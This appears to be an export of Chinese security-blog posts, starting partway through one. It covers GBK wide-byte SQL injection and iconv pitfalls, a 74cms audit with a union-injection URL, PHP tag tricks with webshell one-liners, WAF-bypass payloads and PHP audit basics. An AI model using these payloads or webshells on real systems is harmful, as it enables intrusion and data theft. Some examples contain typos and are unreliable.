<h3 id="3-利用mysql-real-escape-string解决问题"><a href="#3-利用mysql-real-escape-string解决问题" class="headerlink" title="3 利用mysql_real_escape_string解决问题"></a>3 利用mysql_real_escape_string解决问题</h3><p>一些cms把addslashes替换为mysql_real_escape_string来防止宽字节的注入<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029150935.png" alt=""><br>我们若解决需要做的指定php连接mysql的字符集。我们需要在执行sql语句之前调用一下<code>mysql_set_charset</code>函数，设置当前的字符集为gbk,来避免问题<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</div><div class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</div><div class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数库"</span>);</div><div class="line"><span class="comment">//执行sql语句</span></div><div class="line">mysql_set_charset(<span class="string">'gbk'</span>,$conn)</div><div class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? mysql_real_escape_string($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</div><div class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</div><div class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="4-宽字节注入修复"><a href="#4-宽字节注入修复" class="headerlink" title="4 宽字节注入修复"></a>4 宽字节注入修复</h3><p><code>character_set_client=&#39;binary&#39;</code>设置为binary（二进制）,只需要在所有的sql语句前指定一下连接的形式为二进制：<br><code>mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn);</code>,当我们的mysql接受到客户端的数据后，会认为他的编码是<code>character_set_client</code>，然后会将换成<code>character_set_connection</code>的编码，然后在进入具体表和字段后，再转换成字段对应的编码，然后当查询结果产生后，会从表和字段编码，转换成<code>character_set_results</code>编码，返回给客户端。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="comment">//连接数据库部分，注意使用了gbk编码</span></div><div class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</div><div class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</div><div class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</div><div class="line"><span class="comment">//执行sql语句</span></div><div class="line">mysql_query(<span class="string">"SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary"</span>, $conn); </div><div class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</div><div class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</div><div class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>这个方法避免宽字节的注入还是有效的，但是如果开发者画蛇添足的增加一些东西，会让前期的努力前功尽弃。</p>
<h3 id="5-iconv造成的严重后果"><a href="#5-iconv造成的严重后果" class="headerlink" title="5 iconv造成的严重后果"></a>5 iconv造成的严重后果</h3><p>很多cms会将接收到的数据，调用这样一个函数，转换其编码：<br><code>iconv(&#39;utf-8&#39;,&#39;gbk&#39;,$_GET[&#39;id&#39;])；</code>，目的一般是避免乱码，特别是搜索框的位置</p>
<pre><code>&lt;?php
//连接数据库部分，注意使用了gbk编码
$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;) or die(&apos;bad!&apos;);
mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);
mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);
//执行sql语句
mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); 
$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;
$id = iconv(&apos;utf-8&apos;, &apos;gbk&apos;, $id);
$sql = &quot;SELECT * FROM news WHERE tid=&apos;{$id}&apos;&quot;;
$result = mysql_query($sql, $conn) or die(mysql_error());
?&gt;
</code></pre><p>可以发现，在sql语句执行前，将<code>character_set_client</code>设置成了binary，所以避免宽字节的注入问题。但之后其调用了iconv将已经过滤的参数$id给转换了一下，测试一下<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029163501.png" alt=""><br>报错说明我们錦被iconv从utf-8转换成gbk后，变成了%e5%5c，而后面的’被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。利用的是将\转移掉。</p>
<p>利用iconv将gbk转换成utf-8，则可以直接用宽字节注入的姿势来。gbk汉字2字节，utf-8汉字是3字节，若把gbk转换成utf-8,则php会每两个字节一转换。所以，如果\’前面的字符是奇数的话，势必会吞掉\，’逃出限制。</p>
<h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6 总结"></a>6 总结</h3><p>1.gbk编码造成的宽字符注入问题，解决方法是设置character_set_client=binary。</p>
<p>2.矫正人们对于mysql_real_escape_string的误解，单独调用set name=gbk和mysql_real_escape_string是无法避免宽字符注入问题的。还得调用mysql_set_charset来设置一下字符集。</p>
<p>3.谨慎使用iconv来转换字符串编码，很容易出现问题。只要我们把前端html/js/css所有编码设置成gbk，mysql/php编码设置成gbk，就不会出现乱码问题。不用画蛇添足地去调用iconv转换编码，造成不必要的麻烦。</p>
<h3 id="7-代码审计实战"><a href="#7-代码审计实战" class="headerlink" title="7 代码审计实战"></a>7 代码审计实战</h3><p>对骑士cms审计时发现在plus/ajax_street.php</p>
<pre><code>elseif($act == &apos;key&apos;)
{
    $key=trim($_GET[&apos;key&apos;]);
    if (!empty($key))
    {
    if (strcasecmp(QISHI_DBCHARSET,&quot;utf8&quot;)!=0) 
    //对参数key进行utf-8到GBK编码的转换
    $key=iconv(&quot;utf-8&quot;,QISHI_DBCHARSET,$key);
    //带入查询，可注入
    //table($table = &apos;category&apos;)=&gt;&apos;qs_74cmscategory&apos;
    $result = $db-&gt;query(&quot;select * from &quot;.table(&apos;category&apos;).&quot; where c_alias=&apos;QS_street&apos; AND c_name LIKE &apos;%{$key}%&apos; &quot;);
    //将查询结果输出到页面，可回显
    while($row = $db-&gt;fetch_array($result))
    {
        if ($listtype==&quot;li&quot;)
        {
        $htm.=&quot;&lt;li  title=\&quot;{$row[&apos;c_name&apos;]}\&quot; id=\&quot;{$row[&apos;c_id&apos;]}\&quot;&gt;{$row[&apos;c_name&apos;]}&lt;/li&gt;&quot;;
        }
        else
        {
        $_GET[&apos;streetid&apos;]=$row[&apos;c_id&apos;];
        $url=url_rewrite(&apos;QS_street&apos;,$_GET);
        $htm.=&quot;&lt;li&gt;&lt;a href=\&quot;{$url}\&quot; title=\&quot;{$row[&apos;c_note&apos;]}\&quot; class=\&quot;vtip\&quot;&gt;{$row[&apos;c_name&apos;]}&lt;/a&gt;&lt;span&gt;{$row[&apos;stat_jobs&apos;]}&lt;/span&gt;&lt;/li&gt;&quot;;
        };
    }
    if (empty($htm))
        {
        $htm=&quot;&lt;span class=\&quot;noinfo\&quot;&gt;没有找到关键字： &lt;span&gt;{$key}&lt;/span&gt; 相关道路！&lt;/span&gt;&quot;;
        }
        exit($htm);
        }
    }
</code></pre><p>在之前配置文件设置的是<code>mysql_query(&quot;SET character_set_connection=&quot; . $dbcharset . &quot;, character_set_results=&quot; . $dbcharset . &quot;, character_set_client=binary&quot;, $this-&gt;linkid);</code>,其中利用了iconv函数造成致命的错误，同时分析发现页面将查询结果回显回来，构造一些union的查询语句即可获取数据库的敏感信息</p>
<h4 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h4><p>测试有几个字段,发现category表一共有9个字段，所以可以构造获取数据库用户和先关信息的exp<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029201535.png" alt=""><br>然后利用union的查询语句爆出可利用的列为4,8,exp：<br><a href="http://localhost/74cms/upload/plus/ajax_street.php?act=key&amp;key=-%e9%8c%a6&#39; union select 1,2,3,4,5,6,7,8,9-- -" target="_blank" rel="external"></a>,然后是爆出数据库和用户名等相关信息<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029202453.png" alt=""></p>
<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>GBK编码中的两个字符是一个汉字，第一个字符需要大于128</p>
]]></content>
      
        
        <tags>
            
            <tag> 代码审计 PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP代码解析标签]]></title>
      <url>http://yoursite.com/2016/10/28/PHP%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90%E6%A0%87%E7%AD%BE/</url>
      <content type="html"><![CDATA[<h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h3><p>PHP有几种解析标签的写法来标识php代码，其中最标准的&lt;?php ?&gt;,当php解析器找到这个标签时，就会执行标签内部的代码，但在实际的应用时，尤其在上传对内容过滤了&lt;?和php，在这里重点介绍一下</p>
<a id="more"></a>
<h3 id="2-PHP代码解析标签"><a href="#2-PHP代码解析标签" class="headerlink" title="2 PHP代码解析标签"></a>2 PHP代码解析标签</h3><h4 id="A-脚本标签"><a href="#A-脚本标签" class="headerlink" title="A 脚本标签"></a>A 脚本标签</h4><pre><code>形式：&lt;script language=&quot;PHP&quot;&gt;...&lt;/script&gt;,这种写法有点像JavaScript,不过也可以正常解析PHP代码
</code></pre><p>举例：</p>
<pre><code>&lt;script language=”PHP”&gt;include_once(“$_POST[J_drOps]”);&lt;/script&gt;
</code></pre><p>这样的话对于绕过过滤了&lt;?和php的问题，屡试不爽<br>还有一个常用的样式，就是利用反引号执行命令（``）</p>
<pre><code>&lt;script language=&quot;PHP&quot;&gt;echo `$_POST[id]` ;&lt;/script&gt;
</code></pre><p>实际上反引号（``）执行的命令是调用了shell_exec()函数，我们来看具体的测试<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161028203135.png" alt=""></p>
<h4 id="B-短标签"><a href="#B-短标签" class="headerlink" title="B 短标签"></a>B 短标签</h4><p>&lt;?….?&gt;，使用短标签前需要设置php.ini中设置short_open_tage=on,默认是on状态。</p>
<h4 id="C-asp标签"><a href="#C-asp标签" class="headerlink" title="C asp标签"></a>C asp标签</h4><p>&lt;%…%&gt;，在PHP3.0.4版本后可用，需要在php.ini中设置asp_tags=on,默认是off</p>
]]></content>
      
        
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sql注入绕过技巧]]></title>
      <url>http://yoursite.com/2016/10/25/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h3><p>SQL注入绕过的技巧要看具体的环境，可以自己搭建测试，最好是在渗透测试的过程中遇到的环境，否则若仅靠自己凭空想，显然是不靠谱的。这篇文章我会总结一些之前遇到的绕过奇淫技巧，随着自己的见识和能力增强，相信自己总结的方法也会增多。</p>
<a id="more"></a>
<h3 id="2-比较符（-lt-gt-绕过"><a href="#2-比较符（-lt-gt-绕过" class="headerlink" title="2 比较符（&lt;,&gt;)绕过"></a>2 比较符（&lt;,&gt;)绕过</h3><p>在测试盲注时，使用二分查找的时候需要使用到比较操作符来进行查找，若无法使用比较操作符可以使用到greatest来进行绕过。常见的盲注语句如下：</p>
<pre><code>select * from users where id=1 and ascii(substr(database(),0,1))&gt;72
</code></pre><p>若比较操作符被过滤掉，其盲注语句即无法正常使用，则可以使用greatest来代替比较操作符greatest（n1,n2,n3,等）函数返回输入参数（n1,n2,n3,等）的最大值。</p>
<p>我们可以利用greatest进行上面盲注测试：</p>
<pre><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)=72
</code></pre><ul>
<li><p>总结：利用greatest()函数绕过比较操作符</p>
<h3 id="3-引号绕过"><a href="#3-引号绕过" class="headerlink" title="3 引号绕过"></a>3 引号绕过</h3><p>在进行sql语句测试时在限定的where子句中会使用到引号””,看具体的代码：</p>
<p>  select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users”</p>
</li>
</ul>
<p>如果引号被过滤掉，那么上面的where语句则无法使用，遇到这样的问题我们可以使用十六进制来处理这个问题，users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p>
<pre><code>select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273
</code></pre><p>-总结：使用十六进制可以绕过引号</p>
<h3 id="4-逗号的绕过"><a href="#4-逗号的绕过" class="headerlink" title="4 逗号的绕过"></a>4 逗号的绕过</h3><p>在测试盲注的的时候，会利用到substr(),mid(),limit(),这些子句的方法都需要使用到逗号，对于substr()和mid(）这两个方法可以使用from for 的方法来解决</p>
<pre><code>select substr(database(0 from 1 for 1);
select mid(database(0 from 1 for 1);
</code></pre><p>对于limit可以使用offset来绕过</p>
<pre><code>select * form news limit 0,1;
#等价下面的sql语句
select * from news limit 1 offset 0;
</code></pre><ul>
<li><p>总结：使用from绕过逗号</p>
<h3 id="5-注释，括号，-a0绕过空格"><a href="#5-注释，括号，-a0绕过空格" class="headerlink" title="5 注释，括号，%a0绕过空格"></a>5 注释，括号，%a0绕过空格</h3><p>sql注入时，空格的使用是非常普遍的，比如利用union来获得目标的数据</p>
<p>  and 0 union select null,null,null<br>  #上面语句中，and两侧，union两侧，select两侧都需要空格<br>####注释绕过空格</p>
</li>
<li><p>/<em>注释</em>/</p>
<p>  select user() from info;<br>  #########利用注释替换空格，就可以变成<br>  select/<strong>/user()/</strong>/from/**/info<br>或者：</p>
</li>
</ul>
<p><code>/**/un/**/io/**/n/**/sel/**/ec/**/t/**/1,2,3,4,5,5 from admin</code></p>
<p>第二种注释：<br><code>/*!and*/ 1=2</code></p>
<p>####括号绕过空格<br>在mysql中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端可以没有多余的空格。括号绕过空格的方法，在基于时间的盲注时，是屡试不爽</p>
<pre><code>select user() from info where 1=1 and 2=2
</code></pre><p>如何把括号减到最少？，观察user()可以算值，故user()两边要加括号，变成：<br>    select(user())from info where 1=1 and 2=2;<br>继续，1=1和2=2可以算值，也加括号，去空格，变成：</p>
<pre><code>select(user())from info where(1=1)and(2=2);
</code></pre><p>info两边的空格，通常是由程序员自己添加，我们一般无法控制，所以上面就是空格最少的的结果</p>
<p>在以一条time base盲注语句做一个总结：</p>
<pre><code>?id=(sleep(ascii(mid(user()from(2)for(1)))=109))
</code></pre><h3 id="6-绕waf测试套路"><a href="#6-绕waf测试套路" class="headerlink" title="6 绕waf测试套路"></a>6 绕waf测试套路</h3><p>尤其在做CTF比赛时，存在waf最令人头疼，语句的正常注射也是尤为关键，我们这时候可以尝试特殊字符的情况，特殊字符有</p>
<ul>
<li>!@#$%^&amp;*()_-+&lt;&gt;?/|~</li>
</ul>
<p>若在测试的时候某一个字符被替换为空，我们可以得出结论，此字符可以被正常的接受，然后就是用这个字符和语句结合来绕过waf</p>
<h3 id="7-绕过waf-360等防注入软件"><a href="#7-绕过waf-360等防注入软件" class="headerlink" title="7 绕过waf 360等防注入软件"></a>7 绕过waf 360等防注入软件</h3><h4 id="A-大小写变种"><a href="#A-大小写变种" class="headerlink" title="A 大小写变种"></a>A 大小写变种</h4><p>使用起来最简单，效果现在来说不是太显著，比如：and 1=2 AnD 1=3；</p>
<h4 id="B-使用URL编码"><a href="#B-使用URL编码" class="headerlink" title="B 使用URL编码"></a>B 使用URL编码</h4><p>正常编码<br><code>&#39;为%27      /=%2f  %=%25  *==%2a  /**/==%252f%252a*/</code></p>
<h4 id="C-利用嵌套剥离"><a href="#C-利用嵌套剥离" class="headerlink" title="C 利用嵌套剥离"></a>C 利用嵌套剥离</h4><p>有些过滤器会从用户的输入中进行剥离一些敏感的函数，故可以通过函数的嵌套进行绕过一次剥离；</p>
<p><code>selselectect  剥离后为select</code></p>
<h4 id="D-使用空字节"><a href="#D-使用空字节" class="headerlink" title="D 使用空字节"></a>D 使用空字节</h4><p>一些过滤器在处理输入时，若碰到孔子姐就会听之处理，故通常可以利用空字节绕过过滤器。<code>id=1%00 and 1=2</code></p>
<h4 id="E-避开自定义的过滤器"><a href="#E-避开自定义的过滤器" class="headerlink" title="E 避开自定义的过滤器"></a>E 避开自定义的过滤器</h4><p>一些过滤器所过滤的字符串都是事先写入写好的，故只要我们输入的语法和她们过滤的不匹配即可绕过。<code>and 转换为 a+nd a%nd &#39;a&#39;nd %A0and</code></p>
<h4 id="8-命令执行时过滤了空格"><a href="#8-命令执行时过滤了空格" class="headerlink" title="8 命令执行时过滤了空格"></a>8 命令执行时过滤了空格</h4><p>若命令执行时过滤了空格，则可以利用&lt;&gt;来绕过，比如php<code>&lt;&quot;/tmp/code.php&quot;&gt;&quot;/tmp/result.txt&quot;</code>，这条命令里没有空格，会执行code.php里面的代码并且输出重定向到result.txtx里面，还有注意的是，在做命令执行时，很可能命令无法列出所有的文件，可以去php里面找相关的函数来列文件，链接<a href="http://www.freebuf.com/articles/web/54086.html" target="_blank" rel="external"></a></p>
]]></content>
      
        
        <tags>
            
            <tag> SQL </tag>
            
            <tag> WAF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[代码审计基础]]></title>
      <url>http://yoursite.com/2016/10/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<h2 id="1-审计方法与步骤"><a href="#1-审计方法与步骤" class="headerlink" title="1 审计方法与步骤"></a>1 审计方法与步骤</h2><h4 id="A-审计前的准备"><a href="#A-审计前的准备" class="headerlink" title="A 审计前的准备"></a>A 审计前的准备</h4><p>1 获得源码-安装网站（在本地搭建网站，一边审计一边测试，实时跟踪各种动态变化)</p>
<p>2 把我大局</p>
<ul>
<li>网站结构（浏览源码文件夹，了解程序的大致目录）</li>
<li>入口文件（index.php,admin.php文件一般是整个文件的入口，详细读一下index.php文件可知道程序的架构，运行流程等）</li>
<li>配置文件（一般类似config.php等文件，保存一些数据库相关信息程序的一些信息。先看看数据库编码，如果是gbk则可能存在宽字节注入。如果变量的值是双引号，则可能存在双引号解析代码执行问题）</li>
<li>(重点）过滤功能-通过详读公共函数文件和安全过滤文件，清晰掌握用户输入的数据，哪些被过滤，哪些无过滤；过滤方式是替换还是正则?有没有GPC？有没有使用addslasher()处理</li>
</ul>
<a id="more"></a>
<p><img src="http://i1.piimg.com/567571/dfffc0b2306e5093.png" alt=""></p>
<h4 id="B-审计方法"><a href="#B-审计方法" class="headerlink" title="B 审计方法"></a>B 审计方法</h4><ul>
<li>通读源码（一般是企业对自身产品的审计，对于小型应用也可读一读）—-方法：把握大局，然后根据入口文件进行各个模块的审计</li>
<li>敏感函数参数回朔法（shell_exec)—利用Seay法师审计系统，然后可以分析判断敏感函数的上下文，追踪参数源头</li>
<li><p>(重要）定向功能分析法–主要根据程序的业务逻辑来审计，首先用浏览器逐个访问浏览，看看这套程序有哪些功能。根据相关功能，大概存在哪些漏洞。</p>
<p>  常见功能漏洞：（包括但不限于）<br>  初始化安装<br>  站点信息泄露<br>  文件上传，管理<br>  登录认证，权限管理<br>  数据库备份恢复<br>  找回密码<br>  验证码<br>总结：</p>
</li>
<li><p>首先，把握大局，不管什么程序，都要把握大局</p>
</li>
<li>其次，根据定向功能针对每一项功能进行审计；</li>
<li>最后，就是明娜函数参数回溯<h2 id="2-常见的INI配置"><a href="#2-常见的INI配置" class="headerlink" title="2 常见的INI配置"></a>2 常见的INI配置</h2><h4 id="A-配置文件"><a href="#A-配置文件" class="headerlink" title="A 配置文件"></a>A 配置文件</h4></li>
<li>php.ini： 在PHP启动时被读取。对于服务器模块版本的PHP，仅在web服务器启动时读取一次</li>
<li>.user.ini文件：自PHP5.3.0起，php支持基于每个目录的.htaccess风格的INI文件</li>
<li><p>还可以在httpd.conf中覆盖php.ini的值，以进行更灵活的配置</p>
<h4 id="B-配置文件语法"><a href="#B-配置文件语法" class="headerlink" title="B 配置文件语法"></a>B 配置文件语法</h4><h4 id="C-变量相关的配置"><a href="#C-变量相关的配置" class="headerlink" title="C 变量相关的配置"></a>C 变量相关的配置</h4><p>php.ini<br>-<br>  变量相关：<br>  启用全局变量    register_globals = off 作用是关闭自动注册的全局变量，在设置为on的时候，php会将$_POST,$_GET,$_COOKIE,$_ENV,$_SESSION数组总的$key-&gt;$value直接注册为变量，比如$_POST[“username”]就会被注册为$username</p>
<p>  虽然方便了调用，但是有三个问题：</p>
<ul>
<li>不知道变量是哪里来的$_POST的还是$_SESSION来的，非常不方便阅读代码</li>
<li>变量之间互相覆盖，引起不必要的麻烦(重点）</li>
<li><p>安全问题，所以要设置为off<br>短标签：<br>short_open_tag = on<br>这个设置决定是否使用PHP代码开始标志的缩写形式（&lt;??&gt;），若禁用，开始标签必须是完整形式（&lt;?php ?&gt;）<br>同时会影响到缩写形式&lt;?=,它和&lt;?echo等价，从php5.4.0起,&lt;?=总是可用的<br>主要在文件上传使用到，若开启我们可以在上传一句话等使用变形</p>
<h4 id="D-安全模式的配置"><a href="#D-安全模式的配置" class="headerlink" title="D 安全模式的配置"></a>D 安全模式的配置</h4><p>safe_mode = off（默认）</p>
<p>能够控制一些php中的函数，比如system(),同时把很多文件操作函数进行了权限控制，也不允许对某些关键文件的文件，比如/etc/passwd，但是默认的php.ini是没有打开安全模式的<br>本特性已经在PHP5.3.0起飞起并将PHP5.40起移除</p>
<p>禁用类/函数<br>disable_classes=,disable_functions=,disable_function=opendir,readir,scandir,fopen,unlink<br>禁用某些类，禁用某些函数。接受函数分隔的函数名列表作为参数。只能设置在php.ini中</p>
<h4 id="E-上传文件及目录权限的配置"><a href="#E-上传文件及目录权限的配置" class="headerlink" title="E 上传文件及目录权限的配置"></a>E 上传文件及目录权限的配置</h4><p>设置上传及最大上传文件大小<br>file_uploads = on<br>upload_max_filesze = 8M<br>文件上传的临时目录<br>upload_tmp_dir=<br>上传临时文件保存的目录，需要可写，如果不设置，则采用系统临时目录（/tmp,C:\Windows\temp)<br>用户访问目录限制<br>open_basedir = .:/tmp/    linux下:代表不同目录的分隔；windows下;代表不同目录分割<br>能够避免PHP脚本访问不应该访问的文件，一定程度上限制了phpshell的危害。我们一般可以设置为只能访问网站目录，表示允许访问当前目录（即PHP脚本文件所在目录）和/tmp/目录，有效防止php木马跨站运行</p>
<h4 id="F-错误信息的配置"><a href="#F-错误信息的配置" class="headerlink" title="F 错误信息的配置"></a>F 错误信息的配置</h4><p>错误信息控制：<br>display_error = On<br>站点发布后应关闭此功能，以免暴漏信息，调试的时候为了输出错误信息，故打开<br>设置错误报告级别：<br>error_reporting = E_ALL<br>这个设置的作用是将错误级别设置为最高，可以显示所有的问题，方便查错，也有利于写出高质量的代码。推荐使用E_ALL|E_STRICT,即所有级别。<br>错误日志：<br>error_log=<br>错误日志的位置，必须对web用户可写入，如果不定义则默认写入到web服务器的错误日志中<br>log_errors = on<br>如下所言，建议将错误日志输出到文件，而不知直接输出到前端</p>
<h4 id="G-魔术引号及远程文件的配置"><a href="#G-魔术引号及远程文件的配置" class="headerlink" title="G 魔术引号及远程文件的配置"></a>G 魔术引号及远程文件的配置</h4><p>魔术引号（本特性已自PHP5.3.0起废弃并将自PHP5.4.0起移除<br>magic_quotes_gpc = On<br>gagic_quotes_runtime = Off<br>为GPC（Get/Post/Cookie)操作设置magic_quotes状态，当magic_quotes为on，所有单引号，双引号，反斜杠和NULL(%00)被一个反斜杠自动转义<br>是否允许打开远程文件<br>allow_url_fopen = on<br>是否允许包含远程文件（include/require)<br>allow_url_include = false</p>
<h2 id="3-常见危险函数及特殊函数"><a href="#3-常见危险函数及特殊函数" class="headerlink" title="3 常见危险函数及特殊函数"></a>3 常见危险函数及特殊函数</h2><h4 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h4><p>eval$assert（调试函数，和eval同样有把字符长当做php执行的功能）&amp;preg_replace</p>
</li>
<li>mixed eval(string $code)<br>把字符串$code作为php代码执行<br>很多的webshell都是用的eval执行具体的操作&lt;?php @eval($_POST[“0”]);?&gt;</li>
<li>bool assert(mixed $assertion[string $description])<br>检查一个断言是否为FALSE<br>因为大多数杀软把eval列入黑名单，故用assert来替代eval来执行具体的操作</li>
<li>preg_replace($pattern, $replacement, $string)<br>搜索$string中符合正则规则$pattern的部分，以$replacement替换，返回替换后的内容。<br>/e修正符使preg_replace()将replacement参数当做php代码<h4 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h4>require，include，require_once，include_once<br>包含函数也能读取任意文件内容，这需要用到[支持的协议和封装协议]和[过滤器]<br>例如：利用php流filter读取任意文件<br>include($_GET[“file”]);<br>?file=php://filter/convert.base64.encode/resource=index.php<h4 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h4></li>
</ul>
</li>
<li>exec() -执行一个外部程 *</li>
<li>passthru() - 执行外部程序并显示原始输出 *</li>
<li>proc_open() - 执行一个命令并打开文件指针用于读取以及写入</li>
<li>shell_exec() - 通过 Shell 执行命令，并将执行结果作为字符串返回 *</li>
<li>system() - 允许执行一个外部程序并回显输出，类似于 passthru()。 *</li>
<li>popen() - 通过popen()参数传递一条命令，并对popen()所打开的文件进行执行</li>
</ul>
<p>只要命令的参数可控就能执行系统命令<br>例如：</p>
<pre><code>system($cmd);或者system(&apos;ping -c 3&apos;.$target);
当$cmd可以控就能执行任意命令
当$target可控的话，可以使用管道符等特殊函数截断从而执行任意命令
$target = &apos;a | whoami&apos;:

大体的思路就是，先把握大局-&gt;针对漏洞有目的的搜索危险函数-&gt;定位危险函数所在文件-&gt;回溯危险源-&gt;找到执行的函数-&gt;过滤防护
</code></pre><h4 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h4><ul>
<li>copy -拷贝函数</li>
<li>file_get_contents - 把整个文件读入为一个字符串</li>
<li>file_put_contents -将一个字符串写入文件</li>
<li>file -把整个文件读入一个数组中</li>
<li>fopen - 打开文件或者URL</li>
<li>move_uploaded_file -将上传的文件移动到新的位置</li>
<li>readfile - 输出文件</li>
<li>rename -重命名一个文件或目录</li>
<li>rmdir -删除目录</li>
<li>unlink&amp;delete - 删除文件</li>
</ul>
<p>任意文件读取写入删除往往是上面几个函数收到了控制</p>
<h4 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h4><ul>
<li>string getenv(string $varname)<br>获取一个环境变量</li>
<li>bool putenv(string $setting)<br>添加setting到服务器环境变量，环境变量仅存活与当前请求期间，在请求结束时环境就会自动恢复到初始状态</li>
</ul>
<p>配置相关</p>
<ul>
<li>string ini_get(string $varname)  成功时返回配置选项的值</li>
<li>string ini_set(string $varname,string $newvalue)</li>
<li>string ini_alter(string $varname,string $newvalue)</li>
</ul>
<p>设置指定配置选项的值，这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p>
<pre><code>&lt;?php
splay_errors = &quot;.(ini_get(&apos;display_errors&apos;)?&apos;On&apos;:&apos;Off&apos;);
ini_set(&quot;display_errors&quot;,0);
echo &quot;\r\n&lt;br/&gt;display_errors = &quot;.(ini_get(&apos;display_errors&apos;)?&apos;On&apos;:&apos;Off&apos;);
?&gt;
</code></pre><p>数字判断</p>
<ul>
<li>bool is_numeric(mixed $var)<br>如果var是数字和数字字符串则返回TURE，否则返回FALSE，如果仅用is_numeric判断而不用inval转换就有可能插入16进制的字符创到数据库中，进而导致sql的二次注入</li>
</ul>
<p>数组相关</p>
<ul>
<li>bool in_array(mixed $needle,array $haystack[,bool $strict = FALSE])</li>
</ul>
<p>在haystack中搜索needle，若没有设置strict则使用宽松的比较。<br>该函数有一个特性，比较之前会进行自动类型转换</p>
<pre><code> $a = &apos;1abc&apos;
in_array($a,array(1,2,3)的返回值会是真
</code></pre><p>变量覆盖</p>
<pre><code>- void parse_str(string $str[,arrary &amp;$arr])

若str是URL传递的查询字符串(query string),则将它解析为变量并设置到当前域。

&lt;?php
//parse_str
$str = &quot;first=value&amp;arr[]=foobar&amp;arr[]=baz&quot;;
echo &quot;&lt;pre&gt;&quot;;
parse_str($str,$array);
print_r($array);

var_dump(isset($first));//已经复制到数组中，不在当前域

parse_str($str);
var_dump(isset($first));
